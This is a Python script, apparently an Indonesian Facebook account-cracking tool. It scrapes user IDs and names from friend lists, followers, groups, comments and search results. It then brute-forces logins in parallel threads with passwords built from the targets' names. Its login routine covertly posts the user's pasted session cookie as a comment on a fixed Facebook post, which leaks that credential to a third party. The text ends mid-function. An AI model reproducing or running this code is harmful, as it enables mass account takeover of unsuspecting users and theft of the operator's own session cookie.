###---[ INFO AUTHOR GANS DIKIT ]---###
#----[ jangan di oprek, sayangi data hpmu ]-----#
author = 'Rochmat Basuki'
git_hub = 'github.com/RozhBasXYZ'
faceb0ok = 'ROCHMAT BASUKI XD'
version = 'next blade v.1'


###---[ WARNA ]--###
P = '\033[97m'  # PUTIH
M = '\033[91m' # MERAH
hh = '\033[92m'  # HIJAU
kk = '\033[93m'  # KUNING


###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')




###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f""" ██╗  ██╗██╗██╗     ██╗  ██╗██████╗ 
██║ ██╔╝██║██║     ╚██╗██╔╝██╔══██╗
█████╔╝ ██║██║█████╗╚███╔╝ ██║  ██║
██╔═██╗ ██║██║╚════╝██╔██╗ ██║  ██║
██║  ██╗██║██║     ██╔╝ ██╗██████╔╝
╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝ 
                                   """)
def logo2():
	return str(f""" ██╗  ██╗██╗██╗     ██╗  ██╗██████╗ 
██║ ██╔╝██║██║     ╚██╗██╔╝██╔══██╗
█████╔╝ ██║██║█████╗╚███╔╝ ██║  ██║
██╔═██╗ ██║██║╚════╝██╔██╗ ██║  ██║
██║  ██╗██║██║     ██╔╝ ██╗██████╔╝
╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝ 
                                   
                                        
 selamat datang {hh}user{P}, script by {hh}Andre Kanaeru {P} version pribadi""")
 

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'


###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, pro, redmi = [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass

###---[ DUMP UA ]---###
def rol_ua():
	url_ua = [];rc = random.choice
	ua_bot = 'Mozilla/5.0 (Linux; U; Android 2.3; en-US; GT-T9500 Build/MocorDroid2.3.5) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.2.645 U3/0.8.0 Mobile Safari/534.30'
	try:
		os.remove('data/jam_ua.txt')
		os.remove('data/ua_blade.txt')
	except:pass
	open('data/ua_blade.txt','w').write(ua_bot)
	open('data/jam_ua.txt','w').write(str(datetime.now().hour))
	try:
		link = parser(ses.get(f"https://whatmyuseragent.com/"+rc(["browser","brand","platforms"])).text, "html.parser")
		for data in link.find_all("a",href=True):
			if '/browser/' in str(data):url_ua.append(data.get("href"))
	except:url_ua.append('/platforms/mcd/mocordroid/mocordroid-2')
	try:
		url = parser(ses.get("https://whatmyuseragent.com"+rc(url_ua)).text, "html.parser")
		for x in url.find_all("td"):
			if 'useragent' in str(x):
				ua = re.findall('<td class="useragent">(.*?)</td>',str(x))
				open('data/ua_blade.txt','a').write(ua[0]+'\n')
	except:open('data/ua_blade.txt','a').write(ua_bot)


	
## [ UA ] ####
def ua_rozh():
	rr = random.randint; rc = random.choice
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	android = str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(6,12))};",f"Mozilla/5.0 (Linux; Android {str(rr(3,8))}.{str(rr(1,8))}.{str(rr(1,8))};"]))
	model_hp = str(rc([f"SAMSUNG SM-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))})",f"SM-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}",f"Redmi Note {str(rr(6,8))}",f"Redmi {str(rr(4,8))}A",f"GT-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}"]))
	webkit = str(rc([f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0",f"AppleWebKit/537.36 (KHTML, like Gecko)",f"AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0"]))
	chorme = str(rc([f"Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))}",f"Chrome/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(11,99))}"]))
	mobile = str(rc([f"Mobile Safari/537.36"]))

###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	

###---[ DUMP PROXY ]---###
try:
	uadev = requests.get("https://raw.githubusercontent.com/RozhBasXYZ/REMOVE/main/info.txt").text
	if 'useragent' in uadev:pass
	#else:print(' [\033[93m!\033[m] script maintenace...!');input();exit()
	link = parser(ses.get("https://hidemy.name/en/proxy-list/?country=IRRUUS&type=5#list",headers={"user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}).text, "html.parser")
	for x in re.findall("<tr><td>(.*?)</td><td>(.*?)</td><td>",str(link)):
		if 'IP' in str(x):pass
		else:pro.append(x[0]+':'+x[1])
except requests.exceptions.ConnectionError:
	input(f" [{M}>{P}] tidak ada koneksi internet");exit()
	

#input(ua_rozh())
###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	no = 0
	nom = []
	clear_layar()
	print(logo2())
	cookie = input(f"\n [{hh}<{P}] masukan cookie, jangan gunakan akun pribadi\n cookie : ")
	if cookie in ['bladeteamonly']:
		input(f" [{M}>{P}] fitur sedang tidak tersedia")
		data = parser(ses.get("https://www.facebook.com/100032386028880/posts/674525870303608").content, "html.parser")
		for x in re.findall('"text":"(.*?)"',str(data)):
			if 'datr=' in x:
				nom.append(x)
				no+=1
				print(f' [{hh}{no}{P}]. {x}\n')
		abc = input(" nomor : ")
		cookie = nom[int(abc)-1]
		print(f' {hh}{cookie}{P}')
		nom.clear()
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		back()
	except Exception as e:
		print(f" [{M}>{P}] cookie invalid");time.sleep(1);login()
	

###---[ REMOVE TOKEN & COOKIE ]---###
def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
		

###---[ CONVERT USERNAME ]---###
def convert_id(link):
    ses = requests.Session()
    try:
        if 'facebook' in str(link):user = link.split("/")[3]
        else:user = link
        cookie = {"cookie":open(".cookie.txt","r").read()}
        url    = 'https://mbasic.facebook.com/' + user
        req = parser(ses.get(url,cookies=cookie).content,'html.parser')
        kut = req.find('a',string='Lainnya')
        id = str(kut['href']).split('=')[1]
        return(id)
    except:return(link)
	
###---[ MENU UTAMS ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'')
	print(f"\n [{hh}01{P}] crack publik     [{hh}07{P}] crack search")
	print(f" [{hh}02{P}] crack masal      [{hh}08{P}] crack dari file")
	print(f" [{hh}03{P}] crack follow     [{hh}09{P}] cari target kota")
	print(f" [{hh}04{P}] crack komen      [{hh}10{P}] cek hasil akun")
	print(f" [{hh}05{P}] crack group      [{hh}11{P}] cek opsi akun")
	print(f" [{hh}06{P}] crack email      [{hh}12{P}] keluar ({M}cookie{P})")
	ask = input(f'\n [{M}•{P}] menu : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group(c)
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_search()
	elif ask in ['8','08']:crack_file()
	elif ask in ['9','09']:get_sekota(t,c)
	elif ask in ['10']:cek_hasil()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['12']:remove();back()
	else:print(f" [{M}>{P}] isi yang benar");time.sleep(1);back()

	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	print(' ─────────────────────────────')
	try:ok = os.listdir('/sdcard/NBCP')
	except:sys.exit(f" [{M}>{P}] tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('/sdcard/NBCP/'+x,'r').readlines()
		except:continue
		print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')	
	exc = input(f' [{kk}<{P}] nomor yang akan di cek\n nomor : ')
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	detek.append('file')
	for data in open('/sdcard/NBCP/'+file,'r').read().splitlines():
		ua = ua_rozh()
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	print(f'\r [{hh}<{P}] cek opsi checkpoint telah selesai')
	input();back()
	
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] cek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('/sdcard/NBOK')
		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('/sdcard/NBOK/'+x,'r').readlines()
			except:continue
			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/NBOK/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file tidak ada hasil ok")
		print(hh+buka+P)
		input(f'\n[{hh}<{P}] tekan enter untuk kembali')
		back()
	elif one in ['2','02']:
		try:ok = os.listdir('/sdcard/NBCP')
		except:sys.exit(f" [{M}>{P}] tidak hasil cp")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('/sdcard/NBCP/'+x,'r').readlines()
			except:continue
			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/NBCP/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file tidak ada hasil cp")
		print(kk+buka+P)
		input(f'\n[{hh}<{P}] tekan enter untuk kembali')
		back()
	else:print(f" [{M}>{P}] isi yang benar");time.sleep(2);back()
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f' [{hh}<{P}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}>{P}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}{str(rr(1111,9999))}{str(B)}'
		if D in dump:pass
		else:
			print(D)
			dump.append(D+'|123456')
		print('\r sedang dump %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()		

def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] dump dari email, max 1000 id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] masukan 1 nama saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] masukan domain yang benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f' [{hh}<{P}] masukan nama file dump\n file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] pemisah salah")
			dump.append(data)
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:
		print(f" [{M}>{P}] file tidak ada");time.sleep(2);back()
	print(f'\r [{hh}<{P}] total jumlah akun adalah {len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f' [{hh}<{P}] 1 nama setara dengan 10k akun')
	nam = input(f' nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		print(f' [{M}>{P}] gagal dump komen');time.sleep(2);back()
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
def crack_publik(t,c):
	user = input(f' [{hh}<{P}] pastikan akun bersifat publik \n akun : ')
	if(re.findall("\w+",user)):akun = convert_id(user)
	else:akun = user
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
	except Exception as e:
		putar_sound('error')
		print(f" [{M}>{P}] akun tidak publik");time.sleep(2);back()
	atur_atur()
	
def crack_masal(t,c):
    print(f' [{hh}<{P}] maksimal dump masal 5 akun ')
    try:
        bz=0
        apa = int(input(f' jumlah id : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	if '6' in str(bz):atur_atur()
    	user = input(f'\r masukan akun ke {bz} : ')
    	if(re.findall("\w+",user)):akun = convert_id(user)
    	else:akun = user
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r [{kk}!{P}] akun tidak publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	user = input(f' [{hh}<{P}] pastikan akun bersifat publik \n akun : ')
	if(re.findall("\w+",user)):akun = convert_id(user)
	else:akun = user
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		print(f" [{M}>{P}] akun tidak publik");time.sleep(2);back()
		
def crack_group(c):
	link = input(f' [{hh}<{P}] pastikan group bersifat publik \n id group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url,c)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		print(f' [{M}>{P}] gagal dump group');time.sleep(2);back()
	atur_atur()

def dump_grup(url,c):
	link = parser(ses.get(url,cookies=c).content, 'html.parser')
	try:
		for xx in link.find_all('h3'):
			for x in xx.find_all('a',href=True):
				if 'profile.php' in x.get('href'):
					data = str(x).split('id=')[1].split('&')[0]+'|'+str(x.text)
					if data in dump:pass
					else:dump.append(data)
				elif '.com/groups' in x.get('href') or 'story.php' in x.get('href'):pass
				else:
					data = str(x).split('/')[1].split('?')[0]+'|'+str(x.text)
					if data in dump:pass
					else:dump.append(data)
				print('\r dump %s id'%(len(dump)),end='');sys.stdout.flush()
		for x in link.find_all('a',href=True):
			if 'Lihat Postingan Lainnya' in x.text:dump_grup('https://mbasic.facebook.com'+x.get('href'),c)
	except Exception as e:atur_atur()
			


###---[ GET TEMAN SEKOTA ]---###
def dump_kota(t,c,akun):
	try:
		info = ses.get(f'https://graph.facebook.com/{akun}?&access_token={t}',cookies=c).json()
		kota = info['hometown']['name']
		name,id = info['name'],info['id']
	except: print(f" [{M}>{P}] akun tidak publik");time.sleep(2);back()
	print(f"{P} ─────────────────────────────")
	print(f' [{hh}>{P}] data akun target \n [{hh}>{P}] akun : {hh}{id}{P}\n [{hh}>{P}] nama : {hh}{name}{P}\n [{hh}>{P}] kota : {hh}{kota}{P}')
	apa = input(f' [{hh}01{P}] dump id sekota\n [{hh}02{P}] dump semua id\n pilih : ')
	try:
		for x in ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username,hometown)&access_token={t}',cookies=c).json()['friends']['data']:
			try:
				if apa in ['1','01']:
					if kota in str(x['hometown']['name']):
						try:dump.append(x['username']+'|'+x['name'])
						except:dump.append(x['id']+'|'+x['name'])
						print('\r dump %s id'%(len(dump)));sys.stdout.flush()
				elif apa in ['2','02']:
					try:dump.append(x['username']+'|'+x['name'])
					except:dump.append(x['id']+'|'+x['name'])
					print('\r dump %s id'%(len(dump)),end='');sys.stdout.flush()
			except:pass
		atur_atur()
	except Exception as e:
		print(f' [{kk}<{P}] terjadi kesalahan');pass
	
def get_sekota(t,c):
	sekota, nokota = [], []
	target, nom = [], 0
	getid = []
	print(f" [{hh}>{P}] pastikan target bersifat publik")
	akun = input(' target : ')
	try:
		for tmn in ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username,hometown)&access_token={t}',cookies=c).json()['friends']['data']:
			try:
				id = tmn["id"]
				mx = tmn["name"]
				kot = tmn["hometown"]["name"] 
				target.append(str(id)+'|'+str(mx)+'|'+str(kot))
			except:pass
	except Exception as e:
		print(f" [{M}>{P}] akun tidak publik");time.sleep(2);back()
	tampung = []
	for x in target:tampung.append(x)
	target.clear()
	uru = input(f' pilih urutan dump\n [{hh}1{P}] dari new \n [{hh}2{P}] dari old\n urutan : ')
	if uru in ['1']:
		for x in tampung:target.insert(0,x)
	else:
		for x in tampung:target.append(x)
	print(f' [{hh}>{P}] dump berjalan, ctrl+c untuk stop')
	print(f"{P} ─────────────────────────────")
	for data in target:
		id,na,ko = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		try:
			for x in ses.get(f'https://graph.facebook.com/{id}?fields=friends.fields(id,name,username,hometown)&access_token={t}',cookies=c).json()['friends']['data']:
				try:nokota.append(x['id']+'|'+x['name'])
				except:nokota.append(x['id']+'|'+x['name'])
				try:
					if ko in str(x['hometown']['name']):
						try:sekota.append(x['id']+'|'+x['name'])
						except:sekota.append(x['id']+'|'+x['name'])
				except:pass
			sk = str(len(sekota))
			nk = str(len(nokota))
			getid.append(id)
			nom+=1
			print(f' [{hh}>{P}] nomor akun {hh}{nom}{P}\n [{hh}>{P}] nama akun  : {hh}{na}{P}\n [{hh}>{P}] uid akun   : {hh}{id}{P}\n [{hh}>{P}] kota akun  : {hh}{ko}{P} \n [{hh}>{P}] uid total  : {hh}{nk}{P}\n [{hh}>{P}] uid sekota : {hh}{sk}{P}\n')
			nokota.clear()
			sekota.clear()
		except KeyError:
			try:
				for x in ses.get(f'https://graph.facebook.com/{id}?fields=friends.fields(id,name)&access_token={t}',cookies=c).json()['friends']['data']:nokota.append(x['id']+'|'+x['name'])
				nk = str(len(nokota))
				getid.append(id)
				nom+=1
				print(f' [{kk}>{P}] nomor akun {kk}{nom}{P}\n [{kk}>{P}] nama akun  : {kk}{na}{P}\n [{kk}>{P}] uid akun   : {kk}{id}{P}\n [{kk}>{P}] uid total  : {kk}{nk}{P}\n')
				nokota.clear()
			except Exception as e:
				print(f' [{M}>{P}] akun tidak publik\n [{M}>{P}] nama akun  : {M}{na}{P}\n [{M}>{P}] uid akun   : {M}{id}{P}\n');pass
		except KeyboardInterrupt:
			print(f"{P} ─────────────────────────────")
			abc = input(f' [{hh}>{P}] silahkan masukan nomor akun \n nomor : ')
			akun = getid[int(abc)-1]
			dump_kota(t,c,akun)
		except requests.exceptions.ConnectionError:
			print(f"{P} ─────────────────────────────")
			abc = input(f' [{hh}>{P}] silahkan masukan nomor akun \n nomor : ')
			akun = getid[int(abc)-1]
			dump_kota(t,c,akun)
		
###---[ ATUR SEBELUM CRACK ]---###
akunok, uadia, uadarimu = [],[],[]
def atur_atur():
	print('\n ─────────────────────────────')
	ro = input(f' [{hh}1{P}] mobile [{hh}2{P}] mbasic [{hh}3{P}] free\n [{M}•{P}] metode : ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	elif ro in ['3','03']:metode.append('free')
	else:metode.append('mobile')
	print(' ─────────────────────────────')
	ch = input(f' [{hh}1{P}] tertua [{hh}2{P}] ternew [{hh}3{P}] acak\n [{M}•{P}] urutan : ')
	if ch in ['1','01']:
		for x in dump:
			id.append(x)
	elif ch in ['2','02']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(' ─────────────────────────────')
	cp = input(f' [{hh}>{P}] tampilan opsi sesi [ya/no]\n [{M}•{P}] pilih  : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(' ─────────────────────────────')
	apk = input(f' [{hh}>{P}] tampilan info apli [ya/no]\n [{M}•{P}] pilih  : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(' ─────────────────────────────')
	ua = input(f' [{hh}>{P}] gunakan ua manual [ya/no]\n [{M}•{P}] pilih  : ')
	if ua in ['y','Ya','ya','1']:
		uadarimu.append('uadia');bz = input(' isi ua : ');uadia.append(bz)
	else:uadarimu.append('uasc')
	print(' ─────────────────────────────')
	ch = input(f' [{hh}1{P}] manual [{hh}2{P}] gabung [{hh}3{P}] auto\n [{M}•{P}] sandi  : ')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	print(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	input();exit()

def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(' ─────────────────────────────')
	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n [{M}•{P}] sandi  : ').split(',')
	print(f" ─────────────────────────────")
	C = input(f' [{hh}>{P}] input sandi belakang nama\n [{M}•{P}] sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] sandi belakang satu kata saja")
	print(' ─────────────────────────────')
	print(f' [{hh}>{P}] akun ok di : {sim_ok}\n [{M}•{P}] akun cp di : {sim_cp}')
	print(' ─────────────────────────────')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
